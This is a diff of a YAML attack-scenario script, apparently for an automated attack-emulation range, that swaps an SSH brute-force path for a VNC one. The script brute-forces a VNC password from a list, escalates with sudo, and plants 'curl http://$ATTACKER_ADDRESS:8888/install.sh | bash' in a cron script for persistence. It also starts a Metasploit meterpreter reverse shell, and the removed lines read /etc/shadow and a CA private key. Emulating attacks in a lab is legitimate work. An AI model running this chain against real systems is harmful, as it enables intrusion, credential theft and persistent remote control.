@@ -1,68 +1,91 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 3 a b 
 #
 ####################
+
 vars:
   $SERVER_ADDRESS: 192.42.0.254
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
-
+  $LISTA:
+  - "password1"
+  - "password2"
+  - "password3"
+  - "password4"
+  - "password5"
+  - "123"
+  - "12345"
+  - "12345678"
+ 
 commands:
-  - type: shell
-    cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+  - type: loop
+    break_if: $RESULT_STDOUT =~ vnc_connected
+    cmd: "items(LISTA)"
+    commands:
+    - type: vnc
+      creates_session: foothold
+      username: john
+      password: $LOOP_ITEM 
+      hostname: $SERVER_ADDRESS
+      port: "5901"
+      cmd: move
+      x: 5
+      y: 5
 
-  - type: ssh
-    creates_session: foothold
-    username: john
-    password: rambo
-    hostname: $SERVER_ADDRESS
-    port: 10022
-    cmd: id
-
-  - type: ssh
+  - type: vnc
     session: foothold
-    cmd: "tcpdump -A port 21\n"
-    interactive: True
+    cmd: click
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "terminal"
 
   - type: sleep
-    seconds: 20
+    seconds: 3
 
-  - type: ssh
+  - type: vnc
     session: foothold
-    cmd: "03"
-    interactive: True
-    bin: True
+    cmd: key
+    key: "enter"
 
-  - type: ssh
-    session: foothold
-    cmd: "sudo -i\n"
-    interactive: True
+  - type: sleep
+    seconds: 3
 
-  - type: ssh
+  - type: vnc
     session: foothold
-    cmd: "rambo\n"
-    interactive: True
+    cmd: type
+    input: "sudo -i"
 
-  - type: ssh
-    session: foothold
-    cmd: "id\n"
-    interactive: True
+  - type: sleep
+    seconds: 3
 
-  - type: ssh
+  - type: vnc
     session: foothold
-    cmd: "cat /etc/shadow\n"
-    interactive: True
+    cmd: key
+    key: "enter"
 
-  - type: ssh
-    session: foothold
-    cmd: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n"
-    interactive: True
+  - type: sleep
+    seconds: 2
 
-  - type: ssh
+  - type: vnc
     session: foothold
-    cmd: "cat /media/share/healthcheck_cron.sh\n"
-    interactive: True
+    cmd: type
+    input: echo "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash" >> /media/share/healthcheck_cron.sh
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 1
 
   - type: mktemp
     cmd: file
@@ -76,7 +99,7 @@ commands:
     local_path: $RSHELL
 
   - type: msf-module
-    creates_session: portforward
+    creates_session: movement
     cmd: exploit/multi/handler
     payload: "cmd/unix/python/meterpreter/reverse_tcp"
     payload_options:
@@ -91,30 +114,19 @@ commands:
     background: True
     kill_on_exit: true
 
-  - type: ssh
-    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
-    background: True
+  - type: vnc
+    cmd: close
+    session: foothold
 
+#################### MOVED ############################################
   - type: msf-session
-    session: portforward
+    session: movement
     cmd: sysinfo
 
   - type: msf-session
-    session: portforward
-    cmd: portfwd add -l 1881 -r 192.168.100.23 -p 1881
+    session: movement
+    cmd: getuid
 
-  - type: msf-module
-    creates_session: movement
-    cmd: exploit/linux/misc/healthcheck_rce
-    payload: "cmd/linux/http/x64/meterpreter_reverse_tcp"
-    payload_options:
-      LHOST: $ATTACKER_ADDRESS
-      LPORT: "4444"
-    options:
-      RHOSTS: 127.0.0.1  
-
-
-#################### MOVED ################################
   - type: msf-session
     session: movement
     cmd: shell
